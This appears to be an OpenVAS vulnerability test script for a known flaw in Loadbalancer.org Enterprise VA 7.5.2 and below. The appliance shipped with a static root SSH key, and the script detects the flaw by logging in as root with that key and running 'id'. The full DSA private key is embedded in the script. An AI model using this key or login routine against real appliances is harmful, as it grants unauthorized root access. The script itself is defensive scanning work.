###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_loadbalancer_org_enterprise_va_static_ssh_key.nasl 13571 2019-02-11 11:00:12Z cfischer $
#
# Loadbalancer.org Enterprise VA 7.5.2 Static SSH Key
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103922");
  script_version("$Revision: 13571 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Loadbalancer.org Enterprise VA 7.5.2 Static SSH Key");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125754/Loadbalancer.org-Enterprise-VA-7.5.2-Static-SSH-Key.html");

  script_tag(name:"last_modification", value:"$Date: 2019-02-11 12:00:12 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-03-18 11:16:16 +0100 (Tue, 18 Mar 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Gain a shell remotely");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");

  script_tag(name:"impact", value:"A remote attacker can exploit this issue to gain unauthorized root
  access to affected devices. Successfully exploiting this issue allows
  attackers to completely compromise the devices.");

  script_tag(name:"vuldetect", value:"Try to login as root using the known static private key.");

  script_tag(name:"insight", value:"Loadbalancer.org Enterprise VA versions 7.5.2 and below
  come with a static public and private key installed for their appliances. When the keys are
  regenerated, it fails to remove the public key from the authorized_keys2 file, allowing anyone
  to use the private default key for access.");

  script_tag(name:"solution", value:"Upgrade to version 7.5.3 or newer.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Loadbalancer.org Enterprise VA 7.5.2 contains a default
  SSH private key");

  script_tag(name:"affected", value:"Loadbalancer.org Enterprise VA versions 7.5.2 and below");

  exit(0);
}

include("ssh_func.inc");

port = get_ssh_port(default:22);

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

login = 'root';

priv = '-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCsCgcOw+DgNR/7g+IbXYdOEwSB3W0o3l1Ep1ibHHvAtLb6AdNW
Gq47/UxY/rX3g2FVrVCtQwNSZMqkrqALQwDScxeCOiLMndCj61t3RxU3IOl5c/Hd
yhGh6JGPdzTpgf8VhJIZnvG+0NFNomYntqYFm0y11dBQPpYbJE7Tx1t/lQIVANHJ
rJSVVkpcTB4XdtR7TfO317xVAoGABDytZN2OhKwGyJfenZ1Ap2Y7lkO8V8tOtqX+
t0LkViOi2ErHJt39aRJJ1lDRa/3q0NNqZH4tnj/bh5dUyNapflJiV94N3637LCzW
cFlwFtJvD22Nx2UrPn+YXrzN7mt9qZyg5m0NlqbyjcsnCh4vNYUiNeMTHHW5SaJY
TeYmPP8CgYAjEe5+0m/TlBtVkqQbUit+s/g+eB+PFQ+raaQdL1uztW3etntXAPH1
MjxsAC/vthWYSTYXORkDFMhrO5ssE2rfg9io0NDyTIZt+VRQMGdi++dH8ptU+ldl
2ZejLFdTJFwFgcfXz+iQ1mx6h9TPX1crE1KoMAVOj3yKVfKpLB1EkAIUCsG3dIJH
SzmJVCWFyVuuANR2Bnc=
-----END DSA PRIVATE KEY-----';

login = ssh_login ( socket:soc, login:login, password:NULL, pub:NULL, priv:priv, passphrase:NULL );

if( login == 0 )
{
  cmd = ssh_cmd( socket:soc, cmd:"id" );

  if( ereg( pattern:"uid=[0-9]+.*gid=[0-9]+", string:cmd ) )
  {
    security_message( port:port );
    close( soc );
    exit(0);
  }
}

close( soc );
exit( 99 );